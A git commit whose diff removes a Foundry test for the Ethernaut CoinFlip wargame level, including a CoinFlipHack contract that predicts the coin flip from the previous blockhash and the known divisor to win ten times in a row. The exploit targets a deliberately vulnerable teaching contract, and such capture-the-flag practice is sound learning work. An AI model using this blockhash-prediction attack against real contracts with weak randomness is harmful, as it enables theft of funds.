327047d6422895480f8db3e500aafc30854de345
simon busch <simon.busch@live.fr>
2023-07-07 06:03:56 +0200

    start to reset levels

--- test/CoinFlip.t.sol
+++ test/CoinFlip.t.sol
@@ -16,67 +16,6 @@ contract CoinFlipTest is Test {
     }
 
     function testCoinFlipHack() public {
-        /****************
-         * Factory setup *
-         *************** */
-        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
-        ethernaut.registerLevel(coinFlipFactory);
-        vm.startPrank(player);
-        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
-        CoinFlip(payable(levelAddress));
 
-        /****************
-         *    Attack     *
-         *************** */
-        /*
-         * the goal of this contract is to guess the correct outcome 10 times in a row
-         * Walkthrough:
-         * 1) Sets block.height
-         * 2) Create the hack contract.
-         * 3) Run the attack function 10 times
-         */
-        // -- 1 --
-        vm.roll(1);
-        // -- 2 --
-        CoinFlipHack coinFlipHack = new CoinFlipHack(levelAddress);
-        // -- 3 --
-        for (uint i = 0; i <= 10; i++) {
-            vm.roll(1 + i); // must set new block height
-            coinFlipHack.attack();
-        }
-
-        /*****************
-         *Level Submission*
-         ***************  */
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
-    }
-}
-
-/*
- * Attack contract:
- * 1) Instanciate the challenge contract
- * 2) We know the factor used in the CoinFlip contract so we can fake the calls and know before calling the flip function
- */
-
-contract CoinFlipHack {
-    CoinFlip public challenge;
-    uint256 FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-    // -- 1 --
-    constructor(address challengeAddress) {
-        challenge = CoinFlip(payable(challengeAddress));
-    }
-
-    // -- 2 --
-    function attack() external payable {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        challenge.flip(side);
     }
 }
